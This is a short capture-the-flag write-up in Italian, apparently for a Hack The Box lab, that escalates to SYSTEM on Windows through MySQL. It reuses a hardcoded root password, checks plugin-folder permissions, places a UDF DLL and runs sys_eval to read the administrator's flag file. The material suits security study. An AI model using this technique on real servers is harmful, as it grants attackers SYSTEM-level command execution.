# Touch

#### Step-by-Step Privilege Escalation (MySQL UDF to SYSTEM)

**1. Individuazione delle Credenziali**

* Ricerca iniziale: La password di root di MySQL era hardcodata o salvata all'interno dei file di configurazione dell'applicazione (spesso nei file sorgente o di configurazione Node.js del backend del chiosco, ad esempio `HTB@irw4ys_DB!2026`).

**2. Verifica dei Privilegi sul Database**

*   Connessione al database MySQL utilizzando le credenziali recuperate:

    DOS

    ```
    mysql -u root -p"HTB@irw4ys_DB!2026"
    ```
*   Verifica della posizione della cartella dei plugin di MySQL tramite l'interrogazione delle variabili di sistema:

    SQL

    ```
    SHOW VARIABLES LIKE 'plugin_dir';
    ```

    _(La cartella restituita indica dove MySQL cerca i file binari/plugin eseguibili)._

**3. Controllo dei Permessi sul File System (Windows)**

*   Controllo dei permessi sulla cartella dei plugin tramite il comando `icacls` di Windows:

    DOS

    ```
    icacls "C:\MySQL\lib\plugin"
    ```
* _Obiettivo:_ Verificare che l'utente corrente avesse i permessi di scrittura (`(WD)` o scrittura esplicita) su quella specifica directory.

**4. Caricamento della Custom DLL (UDF)**

* Sfruttando i permessi di scrittura sulla cartella dei plugin, è stata inserita una DLL personalizzata (es. `lib_mysqludf_sys_64.dll`).
* Questa libreria espone funzioni personalizzate per eseguire comandi di sistema direttamente dal database, tra cui `sys_eval()`.

**5. Esecuzione dei Comandi come SYSTEM**

* Poiché il servizio MySQL su Windows gira nativamente con i privilegi massimi di `NT AUTHORITY\SYSTEM`, ogni comando eseguito tramite la UDF bypassa i normali limiti dell'utente con cui si è effettuato l'accesso iniziale.
*   Esecuzione del comando per leggere la root flag (facendo attenzione all'escaping dei backslash nel percorso):

    DOS

    ```
    mysql -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"
    ```
